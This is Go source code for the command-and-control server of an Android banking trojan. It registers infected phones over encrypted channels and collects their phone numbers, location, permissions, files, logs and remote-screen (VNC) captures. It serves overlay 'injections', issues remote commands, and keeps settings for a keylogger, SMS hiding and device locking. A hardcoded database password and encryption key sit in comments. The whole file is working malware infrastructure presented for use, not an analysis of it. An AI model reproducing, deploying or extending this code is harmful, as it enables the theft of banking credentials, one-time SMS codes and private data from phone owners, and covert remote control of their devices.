package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/gin-gonic/gin"

	socketio "github.com/googollee/go-socket.io"

	_ "github.com/go-sql-driver/mysql"

	"github.com/joho/godotenv"
	"github.com/user/server_go/src/aes"
	database "github.com/user/server_go/src/db"
)

type response struct {
	Command string   `json:"command"`
	Uid     string   `json:"uid"`
	Apps    []string `json:"apps"`
}

type response2 struct {
	Command string   `json:"command"`
	Uid     string   `json:"uid"`
	Injects []string `json:"injects"`
}

type server1 struct {
	db *sql.DB
}

func GinMiddleware(allowOrigin string) gin.HandlerFunc {
	return func(c *gin.Context) {
		c.Writer.Header().Set("Access-Control-Allow-Origin", allowOrigin)
		c.Writer.Header().Set("Access-Control-Allow-Credentials", "true")
		c.Writer.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS, GET, PUT, DELETE")
		c.Writer.Header().Set("Access-Control-Allow-Headers", "Accept, Authorization, Content-Type, Content-Length, X-CSRF-Token, Token, session, Origin, Host, Connection, Accept-Encoding, Accept-Language, X-Requested-With")

		if c.Request.Method == http.MethodOptions {
			c.AbortWithStatus(http.StatusNoContent)
			return
		}

		c.Request.Header.Del("Origin")

		c.Next()
	}
}

func main() {
	// USER     := "non-root"
	// PASS     := "FjdzdkpGWn5JSaGC"
	// DATABASE := "bot"
	// SRV      := "127.0.0.1"
	// KEY           = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
	// InitialVector = "0123456789abcdef"

	err := godotenv.Load(".env")

	if err != nil {
		log.Fatalf("Error loading .env file")
	}

	USER := os.Getenv("USER1")
	PASS := os.Getenv("PASS")
	DATABASE := os.Getenv("DATABASE")
	SRV := os.Getenv("SRV")
	PORT := os.Getenv("PORT")
	PORTDB := os.Getenv("PORTDB")
	PANEL_BACKEND_URL := os.Getenv("PANEL_BACKEND_URL")

	log.Println("VERSION - 1.0.0")
	log.Println("USER1 - " + USER)
	log.Println("PASS - " + PASS)
	log.Println("DATABASE - " + DATABASE)
	log.Println("SRV - " + SRV)
	log.Println("PANEL_BACKEND_URL - " + PANEL_BACKEND_URL)
	log.Println("PORT - " + PORT)
	log.Println("KEY - " + os.Getenv("KEY1"))
	log.Println("InitialVector - " + os.Getenv("InitialVector"))

	db, err := sql.Open("mysql", USER+":"+PASS+"@tcp("+SRV+":"+PORTDB+")/"+DATABASE)
	if err != nil {
		panic(err)
	}
	defer db.Close()
	_, err = db.Exec(`SET NAMES utf8`)
	if err != nil {
		log.Print(err)
	}

	router := gin.New()

	// server
	server := socketio.NewServer(nil)

	server.OnConnect("/", func(s socketio.Conn) error {
		log.Println("connected id:", s.ID())
		log.Println("connected ip:", s.RemoteAddr())
		return nil
	})

	server.OnEvent("/", "login", func(s socketio.Conn, msg string) {
		decryptData := aes.Decrypt(string(msg))
		var data = make(map[string]string)
		err = json.Unmarshal([]byte(decryptData), &data)

		if err != nil {
			log.Println(err)
			log.Println("data:")
			log.Println(decryptData)
		}

		uid := data["uid"]
		log.Println("OnEvent login ", uid)

		s.SetContext("")
		s.Join(uid)

		isBotExist := database.IsBotExist(db, uid)
		if isBotExist {
			s.Emit("OnUpdate")
			log.Println("OnEvent login - OnUpdate ", uid)
			database.UpdateDateLastConnectionBotAndSettings(db, uid)
		} else {
			s.Emit("OnRegister")
			log.Println("OnEvent login - OnRegister ", uid)
		}
	})

	server.OnEvent("/", "updateCommands", func(s socketio.Conn, msg string) {
		var data = make(map[string]string)
		err = json.Unmarshal([]byte(msg), &data)

		if err != nil {
			log.Println(err)
			log.Println("data:")
			log.Println(msg)
		}

		uid := data["uid"]
		log.Println("OnEvent updateCommands: ", uid)

		isBotExist := database.IsBotExist(db, uid)
		if isBotExist {
			command := database.GetCommandBot(db, uid)
			if strings.Compare(command, "0") != 0 {
				server.BroadcastToRoom("", uid, "commands", aes.Encrypt(command))
			}
		}
	})

	server.OnError("/", func(s socketio.Conn, e error) {
		log.Println("meet error:", e)
	})

	server.OnDisconnect("/", func(s socketio.Conn, reason string) {
		log.Println("closed", reason)
		s.LeaveAll()
	})

	go func() {
		if err := server.Serve(); err != nil {
			log.Fatalf("socketio listen error: %s\n", err)
		}
	}()
	defer server.Close()

	s := server1{db: db}

	router.Use(GinMiddleware(PANEL_BACKEND_URL))
	router.GET("/socket.io/*any", gin.WrapH(server))
	router.POST("/socket.io/*any", gin.WrapH(server))
	router.POST("/php/*any", func(c *gin.Context) {
		body, err := c.GetRawData()
		if err != nil {
			log.Printf("Error reading body: %v", err)
			c.AbortWithStatus(http.StatusNoContent)
			return
		}

		decryptData := aes.Decrypt(string(body))
		var data = make(map[string]string)
		_ = json.Unmarshal([]byte(decryptData), &data)

		if _, ok := data["command"]; ok {
			uid := data["uid"]
			action := data["command"]

			log.Println("action " + string(action) + " uid " + uid)

			isBotExist := database.IsBotExist(s.db, uid)
			if isBotExist {
				database.UpdateDateLastConnectionBot(db, uid)

				switch action {
				case "imgtr":
					{
						t := time.Now()
						date := t.Format("2006-01-02 15:04:05")

						if _, ok := data["vnc_tree"]; ok {
							tree := string(data["vnc_tree"])
							log.Println("OnEvent vnc tree: ", uid)
							database.Vnc_tree(s.db, uid, date, tree)
						}

						if _, ok := data["vnc_image"]; ok {
							vnc_image := string(data["vnc_image"])
							log.Println("OnEvent vnc image: ", uid)
							database.Vnc_image(s.db, uid, date, vnc_image)
						}

						c.String(http.StatusOK, aes.Encrypt("ok"))
					}
				case "updateInjections":
					{
						res := response{}
						json.Unmarshal([]byte(decryptData), &res)

						if err != nil {
							log.Println(err)
							log.Println("data:")
							log.Println(decryptData)
						}

						log.Println("OnEvent updateInjections: ", uid)

						out := database.UpdateInjection(db, uid, res.Apps)
						c.String(http.StatusOK, aes.Encrypt(out))
					}
				case "downloadInjections":
					{
						res := response2{}
						json.Unmarshal([]byte(decryptData), &res)

						if err != nil {
							log.Println(err)
							log.Println("data:")
							log.Println(decryptData)
						}

						log.Println("OnEvent downloadInjections: ", uid)

						injects := res.Injects

						out := database.DownloadInjections(db, uid, injects)
						c.String(http.StatusOK, aes.Encrypt(out))
					}
				case "logs":
					{
						log.Println("OnEvent logs: ", uid)

						application := string(data["application"])
						types := string(data["type"])
						logs := string(data["logs"])

						database.InsertLog(db, uid, application, types, logs)
						c.String(http.StatusOK, aes.Encrypt("ok"))
					}
				case "checkAP":
					{
						log.Println("OnEvent checkAP: ", uid)

						getSettings := database.GetGlobalSettings(db, uid)
						if strings.Compare(getSettings, "0") == 0 {
							log.Println("checkAP send - settings is 0", uid)
							getSettings = `"settings":"0","activeInjection":"0"`
						} else {
							log.Println("checkAP send - settings ", uid)
						}

						command := database.GetCommandBot(db, uid)
						if strings.Compare(command, "0") != 0 {
							log.Println("checkAP send - command 0")
						}

						response := fmt.Sprintf(`{%s,"commands":%s}`, getSettings, command)
						c.String(http.StatusOK, aes.Encrypt(response))
					}
				case "onStartCmd":
					{
						log.Println("OnEvent startCmd: ", uid)

						cmdId := string(data["cmdId"])

						t := time.Now()
						date := t.Format("2006-01-02 15:04:05")

						database.RunCmd(db, uid, date, cmdId)
						c.String(http.StatusOK, aes.Encrypt("ok"))
					}
				case "update":
					{
						log.Println("OnEvent update: ", uid)

						location := string(data["location"])

						batteryLevel := string(data["batteryLevel"])
						accessibility := string(data["accessibility"])
						admin := string(data["admin"])
						screen := string(data["screen"])
						isKeyguardLocked := string(data["isKeyguardLocked"])
						isDozeMode := string(data["isDozeMode"])

						vnc_work_image := string(data["vnc_work_image"])
						vnc_work_tree := string(data["vnc_work_tree"])

						all_permission := string(data["all_permission"])
						contacts_permission := string(data["contacts_permission"])
						accounts_permission := string(data["accounts_permission"])
						notification_permission := string(data["notification_permission"])
						sms_permission := string(data["sms_permission"])
						overlay_permission := string(data["overlay_permission"])

						step := string(data["step"])
						wifiIpAddress := string(data["wifiIpAddress"])

						isDualSim := string(data["isDualSim"])
						operator := string(data["operator"])
						phone_number := string(data["phone_number"])
						operator1 := string(data["operator1"])
						phone_number1 := string(data["phone_number1"])

						sim_data := fmt.Sprintf(`{"operator":"%s","phone_number":"%s","isDualSim":"%s","operator1":"%s","phone_number1":"%s"}`, operator, phone_number, isDualSim, operator1, phone_number1)
						sub_info := fmt.Sprintf(`{"batteryLevel":"%s","accessibility":"%s","admin":"%s","screen":"%s","isKeyguardLocked":"%s","isDozeMode":"%s","vnc_work_image":"%s","vnc_work_tree":"%s"}`, batteryLevel, accessibility, admin, screen, isKeyguardLocked, isDozeMode, vnc_work_image, vnc_work_tree)
						permissions := fmt.Sprintf(`{"all_permission":"%s","contacts_permission":"%s","accounts_permission":"%s","notification_permission":"%s","sms_permission":"%s","overlay_permission":"%s"}`, all_permission, contacts_permission, accounts_permission, notification_permission, sms_permission, overlay_permission)

						t := time.Now()
						date := t.Format("2006-01-02 15:04:05")

						database.UpdateBot(db,
							uid, wifiIpAddress, date, step,
							sub_info, permissions, location, sim_data)
						c.String(http.StatusOK, aes.Encrypt("ok"))
					}
				case "updateSubInfo":
					{
						log.Println("OnEvent updateSubInfo: ", uid)

						batteryLevel := string(data["batteryLevel"])
						accessibility := string(data["accessibility"])
						admin := string(data["admin"])
						screen := string(data["screen"])
						isKeyguardLocked := string(data["isKeyguardLocked"])
						isDozeMode := string(data["isDozeMode"])

						vnc_work_image := string(data["vnc_work_image"])
						vnc_work_tree := string(data["vnc_work_tree"])

						sub_info := fmt.Sprintf(`{"batteryLevel":"%s","accessibility":"%s","admin":"%s","screen":"%s","isKeyguardLocked":"%s","isDozeMode":"%s","vnc_work_image":"%s","vnc_work_tree":"%s"}`, batteryLevel, accessibility, admin, screen, isKeyguardLocked, isDozeMode, vnc_work_image, vnc_work_tree)

						t := time.Now()
						date := t.Format("2006-01-02 15:04:05")

						database.UpdateSubInfoBot(db, uid, date, sub_info)

						c.String(http.StatusOK, aes.Encrypt("ok"))
					}
				case "file":
					{
						log.Println("OnEvent file: ", uid)

						file := string(data["file"])
						path := string(data["path"])

						t := time.Now()
						date := t.Format("2006-01-02 15:04:05")

						database.PutFile(db, uid, date, path, file)
					}
				case "walk":
					{
						log.Println("OnEvent walk: ", uid)

						info := string(data["info"])

						t := time.Now()
						date := t.Format("2006-01-02 15:04:05")

						database.PathInfo(db, uid, date, info)
					}
				case "location":
					{
						log.Println("OnEvent location: ", uid)

						location := string(data["location"])

						t := time.Now()
						date := t.Format("2006-01-02 15:04:05")

						database.UpdateLocationBot(db, uid, date, location)
					}
				default:
					c.AbortWithStatus(http.StatusNoContent)
				}
			} else {
				switch action {
				case "register":
					{
						log.Println("OnEvent register: ", uid)

						country := string(data["country"])
						countryCode := string(data["countryCode"])

						tag := string(data["tag"])

						isDualSim := string(data["isDualSim"])
						operator := string(data["operator"])
						phone_number := string(data["phone_number"])
						operator1 := string(data["operator1"])
						phone_number1 := string(data["phone_number1"])

						version := string(data["version"])
						sdk := string(data["sdk"])
						device := string(data["device"])
						manufacturer := string(data["manufacturer"])
						screenResolution := string(data["screenResolution"])

						location := string(data["location"])

						batteryLevel := string(data["batteryLevel"])
						accessibility := string(data["accessibility"])
						admin := string(data["admin"])
						screen := string(data["screen"])
						isKeyguardLocked := string(data["isKeyguardLocked"])
						isDozeMode := string(data["isDozeMode"])

						vnc_work_image := string(data["vnc_work_image"])
						vnc_work_tree := string(data["vnc_work_tree"])

						all_permission := string(data["all_permission"])
						contacts_permission := string(data["contacts_permission"])
						accounts_permission := string(data["accounts_permission"])
						notification_permission := string(data["notification_permission"])
						sms_permission := string(data["sms_permission"])
						overlay_permission := string(data["overlay_permission"])

						step := string(data["step"])
						wifiIpAddress := string(data["wifiIpAddress"]) + ";" + c.ClientIP()

						sim_data := fmt.Sprintf(`{"operator":"%s","phone_number":"%s","isDualSim":"%s","operator1":"%s","phone_number1":"%s"}`, operator, phone_number, isDualSim, operator1, phone_number1)
						metadata := fmt.Sprintf(`{"android":"%s","manufacturer":"%s","device":"%s","version":"%s", "screenResolution":"%s"}`, sdk, manufacturer, device, version, screenResolution)
						permissions := fmt.Sprintf(`{"all_permission":"%s","contacts_permission":"%s","accounts_permission":"%s","notification_permission":"%s","sms_permission":"%s","overlay_permission":"%s"}`, all_permission, contacts_permission, accounts_permission, notification_permission, sms_permission, overlay_permission)
						sub_info := fmt.Sprintf(`{"batteryLevel":"%s","accessibility":"%s","admin":"%s","screen":"%s","isKeyguardLocked":"%s","isDozeMode":"%s","vnc_work_image":"%s","vnc_work_tree":"%s"}`, batteryLevel, accessibility, admin, screen, isKeyguardLocked, isDozeMode, vnc_work_image, vnc_work_tree)
						settings := fmt.Sprintf(`{"hideSMS":"%s","lockDevice":"%s","offSound":"%s","keylogger":"%s","clearPush":"%s","readPush":"%s","arrayUrl":"%s"}`, "0", "0", "0", "0", "0", "0", "[]")

						t := time.Now()
						date := t.Format("2006-01-02 15:04:05")

						database.RegisterBot(db,
							uid, wifiIpAddress, date,
							country, countryCode,
							tag, step,
							sim_data, metadata, permissions, sub_info, location, settings)

						c.String(http.StatusOK, aes.Encrypt("ok"))
					}
				default:
					c.AbortWithStatus(http.StatusNoContent)
				}
			}
		} else {
			c.AbortWithStatus(http.StatusNoContent)
		}
	})

	if err := router.Run(":" + PORT); err != nil {
		log.Fatal("failed run app: ", err)
	}
}
